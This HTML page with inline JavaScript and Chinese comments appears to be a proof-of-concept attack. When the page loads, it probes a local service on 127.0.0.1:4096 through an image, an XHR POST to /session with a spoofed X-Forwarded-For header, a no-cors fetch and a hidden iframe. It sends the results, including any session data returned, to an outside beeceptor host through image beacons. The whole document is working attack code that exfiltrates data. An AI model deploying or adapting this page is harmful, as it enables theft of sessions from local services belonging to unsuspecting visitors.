<!doctype html>
<meta charset="utf-8">
<script>
const EXFIL = 'https://a-sd-f.free.beeceptor.com';
function log(s) { new Image().src = EXFIL + '/?s=' + encodeURIComponent(s) + '&t=' + Date.now(); }

window.onload = () => {
  log('start');

  // 测试目标是否可达（通过 img 的 onload/onerror）
  const testImg = new Image();
  testImg.onload = () => log('target-reachable-via-img');
  testImg.onerror = () => log('target-unreachable-via-img');
  testImg.src = 'http://127.0.0.1:4096/favicon.ico?t=' + Date.now();

  // 方式1：XHR 带详细错误信息
  var xhr = new XMLHttpRequest();
  xhr.open('POST', 'http://127.0.0.1:4096/session');
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.setRequestHeader('X-Forwarded-For', '127.0.0.1');

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      log('xhr-readyState-4-status-' + xhr.status);
      if (xhr.status === 0) {
        log('xhr-status-0: CORS preflight failed or network error');
      }
    }
  };
  xhr.onload = function() {
    if (xhr.status === 200) {
      log('session=' + encodeURIComponent(xhr.responseText));
    } else {
      log('error-status=' + xhr.status);
    }
  };
  xhr.onerror = function(e) {
    log('request-failed-detail: ' + (xhr.status || 'no-status') + ' ' + (xhr.readyState));
  };
  try {
    xhr.send('{}');
  } catch(e) {
    log('xhr-exception: ' + e.message);
  }

  // 方式2：使用 fetch + no-cors 至少发送请求（无法读响应）
  fetch('http://127.0.0.1:4096/session', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: '{}'
  }).then(() => log('fetch-no-cors-sent')).catch(e => log('fetch-no-cors-fail: ' + e.message));

  // 原有 iframe 探测
  const f2 = document.createElement('iframe');
  f2.style.display = 'none';
  f2.onload = () => log('root-onload');
  f2.onerror = () => log('root-onerror');
  f2.src = 'http://127.0.0.1:4096/';
  document.body.appendChild(f2);
};
</script>
